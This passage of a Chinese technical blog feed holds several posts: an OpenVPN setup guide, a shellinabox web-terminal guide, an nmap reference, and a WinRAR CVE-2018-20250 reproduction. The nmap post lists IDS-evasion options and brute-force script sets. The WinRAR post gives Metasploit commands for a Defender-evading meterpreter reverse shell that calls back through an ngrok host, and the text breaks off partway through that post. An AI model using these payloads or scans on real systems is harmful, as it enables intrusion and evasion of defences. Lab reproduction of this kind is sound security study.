class="line">DEFAULT_FORWARD_POLICY=&quot;ACCEPT&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432909071.png" alt="1554432909071"></p><h4 id="3-开放端口"><a href="#3-开放端口" class="headerlink" title="3. 开放端口"></a>3. 开放端口</h4><p><strong>打开OpenVPN端口并且使变化生效</strong></p><p>调整防火墙本身，以允许流量到OpenVPN。如果在/etc/openvpn/server.conf文件中没有修改OpenVPN的端口号和协议类型，那么直接配置防火墙允许UDP流量到1194端口，如果改变了端口和协议类型，那么根据自己设置的端口和协议类型进行配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 1194/udp</span><br><span class="line">sudo ufw allow OpenSSH</span><br></pre></td></tr></table></figure><p>  从所有修改过的文件中装载配置来关闭和重启防火墙：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br><span class="line">sudo ufw enable</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433320308.png" alt="1554433320308"></p><p>至此服务器端可以正确地处理OpenVPN流量了。</p><h2 id="七、启动OpenVPN服务"><a href="#七、启动OpenVPN服务" class="headerlink" title="七、启动OpenVPN服务"></a>七、启动OpenVPN服务</h2><p>在systemd单元文件的后面，可以通过指定特定的配置文件名来作为一个实例变量来开启OpenVPN服务，我们的配置文件名称为/etc/openvpn/server.conf，所以在systemd单元文件的后面添加@server来开启OpenVPN服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start openvpn@server</span><br><span class="line">sudo systemctl status openvpn@server</span><br></pre></td></tr></table></figure><p>如果一切正常的话，输出应当跟如下类似:</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433559377.png" alt="1554433559377"></p><p>通过<code>ifconfig</code>可以查看新增的ip为<code>inet addr:10.8.0.1</code>的<code>tun0</code>网卡</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433627533.png" alt="1554433627533"></p><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show tun0</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433680420.png" alt="1554433680420"></p><p>如果一切运行正常，将OpenVPN设置为开机自启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable openvpn@server</span><br></pre></td></tr></table></figure><h2 id="八、客户端配置"><a href="#八、客户端配置" class="headerlink" title="八、客户端配置"></a>八、客户端配置</h2><p><strong>制作客户端配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/openvpn/ca/keys</span><br><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf .</span><br></pre></td></tr></table></figure><p>因为是一直root权限操作，所以ubuntu普通用户没有访问证书目录的权限，可赋予普通用户读取权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R +rx /etc/openvpn/ca/</span><br></pre></td></tr></table></figure><p>用scp等方法将keys中的客户端证书文件复制到客户端上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca.crt</span><br><span class="line">ta.key </span><br><span class="line">client.crt </span><br><span class="line">client.key </span><br><span class="line">client.conf</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434147405.png" alt="1554434147405"></p><p>打开client.conf 将<code>remote my-server-1 1194</code>中<code>my-server-1</code> <code>1194</code>替换为服务器的ip/域名，端口，并去掉前面的分号</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434551477.png" alt="1554434551477"></p><p>去掉前面的分号</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434461184.png" alt="1554434461184"></p><p>设置证书地址,如果自定义了客户端证书名称自行更改</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434518742.png" alt="1554434518742"></p><p>删掉分号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 1</span><br></pre></td></tr></table></figure><p>并在下一行添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key-direction 1</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434639408.png" alt="1554434639408"></p><p>把client.conf命名为client.ovpn，然后将<strong>ca.crt ta.key client.crt client.key client.ovpn</strong>复制到客户端配置文件目录（此为windows环境下）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\OpenVPN\config</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434791663.png" alt="1554434791663"></p><h2 id="九、连接测试"><a href="#九、连接测试" class="headerlink" title="九、连接测试"></a>九、连接测试</h2><p>客户端可访问官网（需要FQ），或者通过第三方渠道下载安装</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554435021629.png" alt="1554435021629"></p><p>如图连接成功</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554438169932.png" alt="1554438169932"></p><p>以上就是openvpn服务的搭建过程，如有不对遗漏之处，还望斧正，谢谢。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenVPN </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web终端之shellinabox（配合ngrok远程登陆）</title>
      <link href="/2019/03/21/Web%E7%BB%88%E7%AB%AF%E4%B9%8Bshellinabox%EF%BC%88%E9%85%8D%E5%90%88ngrok%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%89/"/>
      <url>/2019/03/21/Web%E7%BB%88%E7%AB%AF%E4%B9%8Bshellinabox%EF%BC%88%E9%85%8D%E5%90%88ngrok%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Shellinabox 是一个基于 web 的终端模拟器，采用 C 语言编写，使用 Ajax 与后端服务通信。它实现了一个 Webserver，默认监听 4200 端口，在支持 Javascript 和 CSS 的浏览器上访问 <a href="http://host:4200" target="_blank" rel="noopener">http://host:4200</a> 即可。并且可以配置 SSL/TLS 证书，使用 https 方式加密通信。</p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install shellinabox#Debian系</span><br><span class="line">yum install shellinabox#RHEL系</span><br></pre></td></tr></table></figure><h2 id="三、启动"><a href="#三、启动" class="headerlink" title="三、启动"></a>三、启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellinaboxd -h#查看帮助信息</span><br><span class="line">shellinaboxd -b -t  #运行</span><br><span class="line">-b#在后台运行</span><br><span class="line">-t#使用基于http协议的终端</span><br></pre></td></tr></table></figure><a id="more"></a><p><strong>查看端口</strong></p><p>查看进程，是否启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntulp | grep shellinabox</span><br></pre></td></tr></table></figure><h2 id="四、配置"><a href="#四、配置" class="headerlink" title="四、配置"></a>四、配置</h2><h3 id="1-创建普通用户"><a href="#1-创建普通用户" class="headerlink" title="1. 创建普通用户"></a>1. 创建普通用户</h3><p>默认禁用root登陆，需要创建一个普通用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd username</span><br></pre></td></tr></table></figure><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><p>可以需修改端口，或其他配置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/shellinabox</span><br></pre></td></tr></table></figure><h2 id="五、登陆"><a href="#五、登陆" class="headerlink" title="五、登陆"></a>五、登陆</h2><p>局域网内访问  <a href="ip:4200" target="_blank" rel="noopener">ip:4200</a></p><p>输入用户名密码即可登陆</p><h2 id="六、内网映射（可选）"><a href="#六、内网映射（可选）" class="headerlink" title="六、内网映射（可选）"></a>六、内网映射（可选）</h2><h3 id="1-使用ngrok"><a href="#1-使用ngrok" class="headerlink" title="1.使用ngrok"></a>1.使用ngrok</h3><p><strong>使用ngrok，将基于WEB的终端映射到公网</strong></p><ol><li>访问<a href="https://www.ngrok.cc/user.html" target="_blank" rel="noopener">https://www.ngrok.cc/user.html</a> 注册 登录 找到”开通隧道”；</li><li>选择  <code>香港Ngrok免费服务器</code> ,在接下来的界面中选择隧道协议 <code>http</code> ,名称<code>shellinabox</code>（可随便填），前置域名 (不冲突即可)，本地端口(IP:PORT)被转发的ip和端口（不要填127.0.0.1），用户名密码可选填</li><li>在隧道管理中可以看到刚才建立的隧道，需要关注 <code>隧道ID</code>  <code>本地端口</code> 以及<code>域名</code> ，然后去下载Ngrok客户端</li><li>下载linux客户端，./sunny clientid 隧道ID</li><li>然后等待该隧道的建立  访问域名即可</li></ol><p><strong>ngrok.cc详细使用教程：<a href="http://www.ngrok.cc/_book/" target="_blank" rel="noopener">http://www.ngrok.cc/_book/</a></strong></p><h3 id="2-使用frp"><a href="#2-使用frp" class="headerlink" title="2.使用frp"></a>2.使用frp</h3><h3 id="3-使用花生壳"><a href="#3-使用花生壳" class="headerlink" title="3.使用花生壳"></a>3.使用花生壳</h3><p>可去官网开通    <a href="https://hsk.oray.com/" target="_blank" rel="noopener">https://hsk.oray.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellinabox </tag>
            
            <tag> ngrok </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap基础命令</title>
      <link href="/2019/03/16/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/03/16/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p><strong>nmap (network mapper)</strong> 最早是Linux中扫描和嗅探工具，网络连接端扫描工具，主要是探测目标机器上开启的服务、安全性问题、主机存活等等</p><h2 id="二、基本功能"><a href="#二、基本功能" class="headerlink" title="二、基本功能"></a>二、基本功能</h2><ol><li>主机探测；（是否开机）</li><li>服务版本检测；（端口）</li><li>操作系统检测；（OS类型：NT/Linux）</li><li>网络路由跟踪；</li><li>扫描目标机器上的安全漏洞。（脚本引擎NSE）</li></ol><a id="more"></a><h2 id="三、nmap安装"><a href="#三、nmap安装" class="headerlink" title="三、nmap安装"></a>三、nmap安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get isntall nmap</span><br></pre></td></tr></table></figure><h2 id="四、基本用法"><a href="#四、基本用法" class="headerlink" title="四、基本用法"></a>四、基本用法</h2><p>默认情况下，，nmap通过4种方式 — ICMP echo请求（ping）、向443端口发送SYN包、向80端口发送TCP ACK包和ICMP时间戳请求。</p><p><strong>命令行模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -h #帮助信息</span><br><span class="line">nmap [扫描类型] [选项] [目标]</span><br><span class="line">nmap 192.168.1.100#对单个目标进行扫描</span><br></pre></td></tr></table></figure><p>端口状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">open#受理TCP连接、接收UDP数据包或者响应SCTP（流控制传输协议）请求</span><br><span class="line">closed#可以访问端口，但是没有应用程序工作在该端口上</span><br><span class="line">filtered#被过滤的，探测包被包过滤设备屏蔽</span><br><span class="line">unfiltered#未过滤的，不确定是否开放</span><br><span class="line">open|filtered#没有响应，可能是防火墙丢弃数据包</span><br><span class="line">close|filtered#关闭或者被过滤</span><br></pre></td></tr></table></figure><p>批量扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.11.0/24#扫描整个网段</span><br><span class="line">nmap 192.179.1.1-200#扫描1-200之间的主机</span><br><span class="line">nmap 192.167.1.1,2,7-40#十进制的IP区间</span><br><span class="line">nmap 192.168.168.1.0/24 192.10.1.3.1-200#多网段扫描</span><br></pre></td></tr></table></figure><p>文件扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 192.168.10.11 &gt; titlename</span><br><span class="line">nmap iL titlename（扫描文件）</span><br></pre></td></tr></table></figure><p>随机选择目标 nmap -iR ，例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -PS80 -iR 0（无休止去扫描） -p80</span><br></pre></td></tr></table></figure><p>排除扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.0/24 --exculde 192.168.1.1,255,4-10</span><br><span class="line">   --exculde 排除主机/网络</span><br><span class="line">nmap -iL scan_file(要扫的目标) --exculdefile noscan_file(不需要扫)</span><br></pre></td></tr></table></figure><h2 id="五、带有参数的扫描"><a href="#五、带有参数的扫描" class="headerlink" title="五、带有参数的扫描"></a>五、带有参数的扫描</h2><p><strong>TCP扫描</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-s（Scan）-T（TCP）</span><br><span class="line">nmap -sT 192.168.1.1</span><br><span class="line">#使用-sT实现TCP全连接扫描，扫描过程中有三次握手，建立连接则表明端口开放，扫描速度慢，很有可能被目标主机记录下来，低权限默认选项</span><br><span class="line">nmap -sS 192.168.1.1 </span><br><span class="line">#使用syn的数据包去探测,如果收到ACK，则说明端口开放，扫描速度快，比较隐蔽，高权限默认选项</span><br><span class="line">nmap -sN -p- 192.168.1.1 NULL扫描，不设置任何控制位</span><br><span class="line">默认随机1000-p 1-1000-p 20,21,22,23,24,25-p-所有端口</span><br><span class="line">nmap -sF 192.168.1.1#FIN扫描仅设置FIN标志位</span><br><span class="line">nmap -sX 192.168.1.1#XMAS扫描，设置FIN、PSH、URG的标识位，返回RST响应即端口关闭，无响应即打开|过滤状态</span><br><span class="line">nmap -sM 192.168.1.1#对于BSD衍生版本，回复RST响应即端口关闭，端口开放会丢弃</span><br><span class="line">nmap -sA 192.168.1.1#确定哪些端口被防火墙屏蔽，只有ACK标识位，回复RST，则没有被过滤</span><br><span class="line">nmap -sW 192.168.1.1#TCP窗口扫描，检测目标返回的RST数据包中的TCP窗口字段，端口开放为正值，关闭为0</span><br><span class="line">nmap -sI 192.168.1.1#通过指定的僵尸主机发送扫描数据包，本机不与目标主机通信</span><br></pre></td></tr></table></figure><p><strong>UDP扫描</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 192.168.1.1 -p 53,161#非常慢，所以可以指定端口扫描</span><br></pre></td></tr></table></figure><p>改善扫描速度主要有：</p><ul><li>进行并发的UDP扫描</li><li>优先扫描常用端口</li><li>防火墙后面扫描</li><li>启用–host-time选项跳过响应过慢的主机</li></ul><p><strong>保存输出</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1 -oN #交互输出，不显示runtime信息和警告信息</span><br><span class="line">nmap 192.168.1.1 &gt;./result.txt#将结果写入到文件中</span><br><span class="line">nmap 192.168.1.1 -oX result.xml#XML格式，可被Nmap图形界面解析，也方便导入数据库</span><br><span class="line">nmap 192.168.1.1 -oG#方便grep和awk整理扫描结果</span><br><span class="line">nmap 192.168.1.1 -oA#三种方式输出</span><br><span class="line">xsltproc result.xml -o result.html#xml转换为html</span><br></pre></td></tr></table></figure><p><strong>时间控制</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap -T 0 192.168.1.1#每5分钟发送一次数据包，且不会并行发送多组数据，不会被IDS检测到</span><br><span class="line">nmap -T 1 192.168.1.1#每15秒发送一次数据包，且不会并行发送多组数据</span><br><span class="line">nmap -T 2 192.168.1.1#每0.4秒发送一次数据包，且不会并行发送多组数据</span><br><span class="line">nmap -T 3 192.168.1.1#默认模式，同时向多个目标发送多个数据包，自动在扫描时间和网络负载之间平衡</span><br><span class="line">nmap -T 4 192.168.1.1#对每个目标只扫描5分钟，然后扫描下一台，等待响应时间不超过1.25秒</span><br><span class="line">nmap -T 5 192.168.1.1#对每个目标只扫描75秒，然后扫描下一台，等待响应时间不超过0.3秒</span><br><span class="line">无特殊需求，默认即可</span><br></pre></td></tr></table></figure><p><strong>常用选项</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.1#服务版本识别</span><br><span class="line">nmap -O 192.168.1.1 #操作系统检测</span><br><span class="line">nmap -Pn 192.168.1.1#主机屏蔽ping请求，禁用主机检测功能，直接进行扫描</span><br><span class="line">nmap -A 192.168.1.1 #强力检测，服务版本(-sV)，操作系统(-o)，脚本(-sC)，路由(--traceroute)</span><br></pre></td></tr></table></figure><p>扫描IPv6主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -6 IPv6地址#只能逐个指定目标进行扫描，端口比IPv4要少，部分服务未支持IPv6</span><br></pre></td></tr></table></figure><p>规避IDS/防火墙检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-f;--mtu#使用&lt;=8字节数据体的数据包;mtu调整数据包大小，必须是8的整数倍</span><br><span class="line">-D &lt;decoy1,decoy2,ME&gt;RND: number(个数)</span><br><span class="line">#掺杂伪装假IP，掩盖真实IP，RND随机生成，越往后越好，需要伪装成在线主机，否则容易造成网络拥堵；可以用在ping扫描，端口扫描，操作系统检测，不可用于版本检测和TCP连接扫描</span><br><span class="line">-S &lt;IP_Address&gt;#源地址哄骗</span><br><span class="line">-e &lt;interface&gt;#指定网卡接口</span><br><span class="line">--source-port&lt;portnumber&gt;/-g(模拟源端口)#防火墙限制入站流量使用</span><br><span class="line">--data-length#改变发送数据包的默认长度，比年被识别出是nmap扫描</span><br><span class="line">--max-parallelism#限制Nmap并发扫描最大连接数</span><br><span class="line">--scan-delay &lt;time&gt;#控制发送探测数据的时间间隔，避免达到IDS/IPS端口扫描规则的阈值</span><br><span class="line">--data-length &lt;number&gt;#发送报文时 附加随机数据</span><br><span class="line">--randomize-hosts#对目标主机的顺序随机排列</span><br><span class="line">--spoof-mac &lt;mac address，prefix，or vendor name&gt;#MAC地址哄骗</span><br></pre></td></tr></table></figure><p>官方文档：<a href="https://nmap.org/man/zh/man-bypass-firewalls-ids.html" target="_blank" rel="noopener">https://nmap.org/man/zh/man-bypass-firewalls-ids.html</a></p><h2 id="六、高级用法"><a href="#六、高级用法" class="headerlink" title="六、高级用法"></a>六、高级用法</h2><p><strong>脚本引擎，扫描安全漏洞</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">--script#使用脚本探测漏洞</span><br><span class="line">nmap --script#脚本名称 目标</span><br><span class="line">#在nmap的安装路径中有 /script/</span><br><span class="line">#在该目录中存放nmap的脚本</span><br><span class="line">nmap -sC/-A/--script=default 192.168.1.1#启动默认类NSE脚本</span><br><span class="line">nmap --script=vuln 203.207.118.201#自动测试漏洞</span><br><span class="line">nmap 目标 --script=auth,vuln  #判断常见的漏洞并扫描端口</span><br><span class="line">nmap --script http-enum,http-headers,http-methods,http-php-version -p 80 192.168.1.1</span><br><span class="line">#分析HTTP服务</span><br><span class="line">nmap --script smb-vuln-ms17-010 192.168.11.232#永恒之蓝</span><br><span class="line">nmap --script smb-check-vulns 192.168.11.232#MS08-067（SMB）溢出漏洞</span><br><span class="line">nmap --script ssl-heartbleed 192.168.11.232#探测心脏滴血漏洞</span><br><span class="line"></span><br><span class="line">nmap 目标 --script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute#扫描端口并且标记可以爆破的服务</span><br><span class="line"></span><br><span class="line">nmap 目标 --script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version#精确判断漏洞并扫描端口</span><br><span class="line"></span><br><span class="line">nmap -iL host.txt --script=auth,vuln,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute &gt; scan.txt</span><br></pre></td></tr></table></figure><p>参考：</p><p>Nmap参考指南(真香)：<a href="https://nmap.org/man/zh/index.html#man-description" target="_blank" rel="noopener">https://nmap.org/man/zh/index.html#man-description</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-20250-WinRAR远程代码执行漏洞</title>
      <link href="/2019/03/16/CVE-2018-20250-WinRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/03/16/CVE-2018-20250-WinRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>WinRAR 代码执行相关的CVE 编号如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253</span><br></pre></td></tr></table></figure><p>这里我们复现最开始的WinRAR目录穿越漏洞（CVE-2018-20250）。</p><h2 id="二、漏洞详情"><a href="#二、漏洞详情" class="headerlink" title="二、漏洞详情"></a>二、漏洞详情</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h3><p>WinRAR目录穿越漏洞（CVE-2018-20250）：</p><p>​    该漏洞是由于WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在2006 年被编译，没有任何的基础保护机制(ASLR,DEP 等)。该动态链接库的作用是处理ACE 格式文件。而在解压处理过程中存在一处目录穿越漏洞,允许解压过程写入文件至开机启动项，导致代码执行。</p><a id="more"></a><p><em>漏洞细节</em>: <a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p><h3 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WinRAR &lt; 5.70 Beta 1</span><br><span class="line">Bandizip &lt; = 6.2.0.0</span><br><span class="line">好压(2345压缩) &lt; = 5.9.8.10907</span><br><span class="line">360压缩 &lt; = 4.0.0.1170</span><br></pre></td></tr></table></figure><h2 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h2><h3 id="1-准备"><a href="#1-准备" class="headerlink" title="1. 准备"></a>1. 准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KaliLinux（2019.1)</span><br><span class="line">Metasploit(KaliLinux2019.1已经集成了Metasploit5)</span><br><span class="line">ngrok</span><br></pre></td></tr></table></figure><h3 id="2-下载EXP"><a href="#2-下载EXP" class="headerlink" title="2. 下载EXP"></a>2. 下载EXP</h3><p><strong>下载WinRAR远程代码执行漏洞EXP利用文件:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/WyAtu/CVE-2018-20250.git</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/1552705180118.png" alt="1552705180118"></p><h3 id="3-开启ngrok"><a href="#3-开启ngrok" class="headerlink" title="3. 开启ngrok"></a>3. 开启ngrok</h3><p>浏览器打开<a href="https://www.ngrok.com/" target="_blank" rel="noopener">https://www.ngrok.com/</a> 进行账号登录，开通一个免费的隧道转发代理。</p><p>按照首页的步骤建立如下连接</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/343244.png" alt></p><h3 id="4-生成Payload"><a href="#4-生成Payload" class="headerlink" title="4. 生成Payload"></a>4. 生成Payload</h3><p>Metasploit生成免杀Payload 载荷(针对Windows10的defender)</p><p>使用Metasploit5自带的免杀模块生成Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use evasion/windows/windows_defender_exe(选择msf5免杀模块)</span><br><span class="line">show info(显示模块信息)</span><br><span class="line">set filename WinRarPayloadTest.exe(设置Payload名字 )</span><br><span class="line">set payload windows/meterpreter/reverse_tcp(设置Payload类型 )</span><br><span class="line">set lhost tcp://0.tcp.ngrok.io(设置上线地址，填写Ngrok映射出去的地址即可)</span><br><span class="line">set lport 17814(设置监听端口，填写Ngrok映射出去的端口即可 )</span><br><span class="line">run(生成Payload)</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sfasfe.png" alt></p><p>把Payload文件放到EXP文件夹下的根目录</p><p><img 